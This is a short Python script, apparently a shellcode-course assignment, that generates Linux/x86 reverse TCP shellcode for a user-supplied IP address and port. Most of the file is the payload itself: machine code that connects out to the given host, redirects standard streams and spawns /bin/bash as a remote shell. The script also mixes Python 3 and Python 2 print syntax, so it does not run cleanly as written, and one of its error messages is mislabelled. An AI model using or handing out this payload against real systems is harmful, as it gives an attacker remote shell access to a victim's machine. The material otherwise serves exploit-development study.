# SLAE Assignment #1: Shellcode Reverse TCP (Linux/x86) 
# Website:  http://blog.jsiob.com
# SLAE-ID: 1400


#!/usr/bin/env python3
import sys
import argparse
import codecs
import socket

parser = argparse.ArgumentParser()
parser.add_argument('-i', "--ip")
parser.add_argument('-p', "--port")
args = parser.parse_args()


if args.port == None or args.ip == None:
	parser.print_help()
	exit()
port = int(args.port)
ip = str(args.ip)

if port > 65535:
    print("Please enter a valid port number!")
    exit()

if port < 1024:
    print("You'll need to be root to use this port!")

hex_port = hex(port)[2:]


b1 = hex_port[-2:]
b2 = hex_port[:-2]

if b1 == "00" or b2 == "00":
        print "Port contains \\x00!"
        exit()

if len(b1) < 2:
        b1="\\x0" + b1
if len(b1) == 2:
        b1="\\x" + b1
if len(b2) < 2:
        b2="\\x0" + b2
if len(b2) == 2:
        b2="\\x" + b2

shellport=b2+b1



p1 = str(hex(int(ip.split('.')[0])))[2:]
p2 = str(hex(int(ip.split('.')[1])))[2:]
p3 = str(hex(int(ip.split('.')[2])))[2:]
p4 = str(hex(int(ip.split('.')[3])))[2:]

		
if len(p1) < 2:
        p1="\\x0" + p1
if len(p1) == 2:
        p1="\\x" + p1
		
if len(p2) < 2:
        p2="\\x0" + p2
if len(p2) == 2:
        p2="\\x" + p2
		
if len(p3) < 2:
        p3="\\x0" + p3
if len(p3) == 2:
        p3="\\x" + p3
		
if len(p4) < 2:
        p4="\\x0" + p4
if len(p4) == 2:
        p4="\\x" + p4
		
		
if p1 == "\\x00" or p2 == "\\x00" or p3 == "\\x00" or p4 == "\\x00":
        print "Port contains \\x00!"
        exit()
		


shellip = p1+p2+p3+p4


shellcode = """
\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x68%s
\\x66\\x68%s\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xb3\\x03\\xcd\\x80\\x89\\xfb\\x6a
\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69
\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x89\\xc1\\xb0\\x0b\\xcd\\x80
""" % (shellip, shellport)

print("Shellcode:")
print(shellcode.replace("\n", ""))

